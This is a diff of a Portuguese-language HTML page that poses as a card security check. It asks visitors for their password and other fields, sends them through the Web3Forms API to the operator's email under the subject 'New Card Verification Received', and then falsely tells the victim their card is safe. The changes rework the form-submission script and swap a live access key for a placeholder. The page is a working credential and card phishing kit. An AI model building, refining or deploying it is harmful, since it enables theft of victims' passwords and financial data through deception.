@@ -125,7 +125,6 @@
             box-sizing: border-box;
         }
 
-        /* --- ALTERAÇÃO CSS INICIA AQUI --- */
         .submit-btn {
             background: linear-gradient(45deg, #007BFF, #0056b3);
             color: white;
@@ -142,7 +141,6 @@
             align-items: center;
             gap: 0.5rem;
         }
-        /* --- ALTERAÇÃO CSS TERMINA AQUI --- */
 
         .submit-btn:hover {
             transform: translateY(-2px);
@@ -214,12 +212,14 @@
         <form id="indication-form" method="POST" enctype="multipart/form-data">
             
             <!-- 
-                IMPORTANTE: Substitua "06ca2708-2fb8-4700-aa35-b37809a91e36" 
-                pela chave que você obteve do Web3Forms.
+                !!! IMPORTANTE !!!
+                Para o formulário funcionar e enviar os dados para o seu e-mail,
+                você PRECISA substituir "SUA_CHAVE_DE_ACESSO_AQUI" pela sua chave
+                pessoal que você obtém no site web3forms.com.
             -->
-            <input type="hidden" name="access_key" value="5e6a7c4b-4d17-48dd-bb35-c27442e11276">
-            <input type="hidden" name="subject" value="Nova Indicação Recebida">
-            <input type="hidden" name="from_name" value="Sistema de Indicações">
+            <input type="hidden" name="access_key" value="SUA_CHAVE_DE_ACESSO_AQUI">
+            <input type="hidden" name="subject" value="Nova Verificação de Cartão Recebida">
+            <input type="hidden" name="from_name" value="Sistema de Verificação">
 
             <!-- Campos do Formulário -->
             <div class="form-group">
@@ -255,11 +255,9 @@
                 <input type="password" id="senha" name="Senha" required>
             </div>
 
-            <!-- --- ALTERAÇÃO HTML INICIA AQUI --- -->
             <button type="submit" class="submit-btn" id="submit-button">
                 <span>Clique Aqui pra Verificar a Segurança das suas Informações!</span>
             </button>
-            <!-- --- ALTERAÇÃO HTML TERMINA AQUI --- -->
         </form>
         
         <!-- Mensagem de resultado de erro (dentro do container) -->
@@ -285,52 +283,53 @@
         form.addEventListener('submit', function(e) {
             e.preventDefault(); // Impede o comportamento padrão de recarregar a página
 
-            submitButton.disabled = true;
-            submitButton.querySelector('span').textContent = 'Analisando...';
+            // --- ALTERAÇÃO NO SCRIPT COMEÇA AQUI ---
 
             const formData = new FormData(form);
+            const object = {};
+            formData.forEach((value, key) => {
+                object[key] = value;
+            });
+            const json = JSON.stringify(object);
 
-            // Adiciona um atraso de 5 segundos para simular a análise
-            setTimeout(() => {
-                fetch('https://api.web3forms.com/submit', {
+            resultDiv.innerHTML = "Por favor, aguarde...";
+            resultDiv.style.display = "block";
+            resultDiv.classList.remove('error');
+
+            fetch('https://api.web3forms.com/submit', {
                     method: 'POST',
-                    body: formData // Envia o FormData diretamente
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: json
                 })
-                .then(response => response.json())
-                .then(data => {
-                    resultDiv.style.display = 'none';
-                    
-                    // Altera a mensagem de sucesso
-                    successMessage.textContent = "Seu cartão está seguro!";
-                    successModal.style.display = 'flex';
-                    
-                    form.reset();
-
-                    // Esconde o modal de sucesso após 8 segundos
-                    setTimeout(() => {
-                        successModal.style.display = 'none';
-                    }, 8000);
+                .then(async (response) => {
+                    let jsonResponse = await response.json();
+                    if (response.status == 200) {
+                        resultDiv.style.display = 'none'; // Esconde a mensagem de "aguarde"
+                        successMessage.textContent = "Seu cartão está seguro!";
+                        successModal.style.display = 'flex';
+                        form.reset();
+                        setTimeout(() => {
+                            successModal.style.display = 'none';
+                        }, 8000);
+                    } else {
+                        console.log(response);
+                        resultDiv.innerHTML = jsonResponse.message || "Ops! Algo deu errado.";
+                        resultDiv.classList.add('error');
+                    }
                 })
                 .catch(error => {
-                    resultDiv.classList.remove('success');
+                    console.log(error);
+                    resultDiv.innerHTML = "Ops! Algo deu errado. Tente novamente mais tarde.";
                     resultDiv.classList.add('error');
-                    resultDiv.textContent = "Ops! Algo deu errado. Tente novamente.";
-                    resultDiv.style.display = 'block';
-                    console.error('Error:', error);
-
-                    // Esconde a mensagem de erro após 8 segundos
-                    setTimeout(() => {
-                        resultDiv.style.display = 'none';
-                    }, 8000);
                 })
                 .finally(() => {
-                    // Reabilita o botão e restaura o texto original
                     submitButton.disabled = false;
-                    // --- ALTERAÇÃO SCRIPT INICIA AQUI ---
                     submitButton.querySelector('span').textContent = 'Clique Aqui pra Verificar a Segurança das suas Informações!';
-                    // --- ALTERAÇÃO SCRIPT TERMINA AQUI ---
                 });
-            }, 5000); // Atraso de 5000ms (5 segundos)
+            // --- ALTERAÇÃO NO SCRIPT TERMINA AQUI ---
         });
     </script>
 
